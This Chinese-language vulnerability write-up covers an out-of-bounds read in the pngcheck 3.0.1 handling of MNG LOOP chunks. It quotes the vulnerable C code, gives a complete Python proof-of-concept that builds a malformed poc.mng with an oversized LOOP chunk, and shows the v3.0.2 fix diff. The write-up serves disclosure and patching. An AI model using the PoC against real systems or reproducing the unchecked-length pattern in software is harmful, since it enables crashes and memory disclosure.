---
nav_path_prefix: Security > Vulns > pngcheck >
tags: [Out-of-bounds Read]
---

# Vulns in pngcheck 3.0.1

## 漏洞概要

[pngcheck](http://www.libpng.org/pub/png/apps/pngcheck.html) 是一个用于验证 PNG / JNG / MNG 文件格式的命令行工具。该工具在处理 MNG LOOP 块时，由于未充分验证块大小 (`sz`)，导致缓冲区越界读取。

## 漏洞原理

源码地址：[http://www.libpng.org/pub/png/src/pngcheck-3.0.1.zip](http://www.libpng.org/pub/png/src/pngcheck-3.0.1.zip)

```c title="pngcheck.c" linenums="3809"
} else if (strcmp(chunkid, "LOOP") == 0) {
  if (png || jng) {
    printf("%s  LOOP not defined in %cNG\n", verbose? ":":fname,
      png? 'P':'J');
    set_err(kMinorError);
  } else if (sz < 5 || (sz > 6 && ((sz-6) % 4) != 0)) {
   printf("%s  invalid %slength\n",
      verbose? ":":fname, verbose? "":"LOOP ");
    set_err(kMajorError);
  }
  if (verbose && no_err(kMinorError)) {
    printf(":  nest level = %u\n    count = %lu, termination = %s\n",
      (unsigned)(buffer[0]), LG(buffer+1), sz == 5?
      termination_condition[0] :
      U2NAME(buffer[5] & 0x3, termination_condition));
      /* GRR:  not checking for valid buffer[1] values */
    if (sz > 6) {
      printf("    iteration min = %lu", LG(buffer+6));
      if (sz > 10) {
        printf(", max = %lu", LG(buffer+10));
        if (sz > 14) {
          long i, count = (sz-14) >> 2;

          printf(", signal number%s = %lu", (count > 1)? "s" : "",
            LG(buffer+14));
          for (i = 1;  i < count;  ++i)
            printf(", %lu", LG(buffer+14+(i<<2)));
        }
      }
      printf("\n");
    }
  }
  last_is_IDAT = last_is_JDAT = 0;
```

当 `sz` 大于缓冲区 `buffer` 的最大大小 `BS` (`32000`) 时，`for` 循环继续执行，造成越界读取。

## 漏洞复现

- POC 代码：[poc.py](https://github.com/13m0n4de/pngcheck-vulns/blob/main/vulns-3.0.1/poc.py)
- POC 图片：[poc.mng](https://github.com/13m0n4de/pngcheck-vulns/blob/main/vulns-3.0.1/poc.mng)

```python title="poc.py"
#!/usr/bin/env python3
"""
PNGCheck Vulnerability POC Generator
Generates POC file demonstrating buffer over-read
vulnerability in pngcheck 3.0.1
"""

import argparse
import pathlib
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)


MNG = Struct(
    "signature" / Const(b"\x8aM\x4e\x47\x0d\x0a\x1a\x0a"),
    "chunks" / GreedyRange(Chunk),
)


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF,
    }


def generate_poc(output_path: pathlib.Path) -> None:
    # Command: pngcheck -v poc.mng
    chunks = [
        create_chunk(b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
        create_chunk(
            b"LOOP",
            b"\x00"  # nest_level(1)
            + b"\x00\x00\x00\x01"  # iteration_count(4)
            + b"\x00"  # termination_condition(1)
            + b"\x00\x00\x00\x01" * 10000,  # Iteration_min(4) + ...
        ),
        create_chunk(b"MEND", b""),
    ]
    MNG.build_file(dict(chunks=chunks), output_path)


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Generate POC files for pngcheck 3.0.1 buffer over-read "
            "vulnerability (unchecked chunk size in LOOP chunk)"
        )
    )
    parser.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        default="poc.mng",
        help="Output file path (default: poc.mng)",
    )
    args = parser.parse_args()

    print("Generating POC...")
    generate_poc(args.output)
    print("POC file generated successfully")


if __name__ == "__main__":
    main()
```

```
$ ./pngcheck -v poc.mng
```

## 漏洞修复

官方在 v3.0.2 版本中通过添加 `sz > BS` 校验修复漏洞：

```diff
@@ -3815,8 +3815,12 @@
         printf("%s  invalid %slength\n",
           verbose? ":":fname, verbose? "":"LOOP ");
         set_err(kMajorError);
-      }
-      if (verbose && no_err(kMinorError)) {
+      } else if (sz > BS) {
+	/* FIXME: large LOOP chunks should be supported */
+        printf("%s  checking large %schunk not currently supported\n",
+          verbose? ":":fname, verbose? "":"LOOP ");
+        set_err(kMinorError);
+      } else if (verbose && no_err(kMinorError)) {
         printf(":  nest level = %u\n    count = %lu, termination = %s\n",
           (unsigned)(buffer[0]), LG(buffer+1), sz == 5?
           termination_condition[0] :
```

## 参考资料

- [pngcheck Home Page](http://www.libpng.org/pub/png/apps/pngcheck.html)
- [MNG (Multiple-image Network Graphics) Format](http://www.libpng.org/pub/mng/spec)
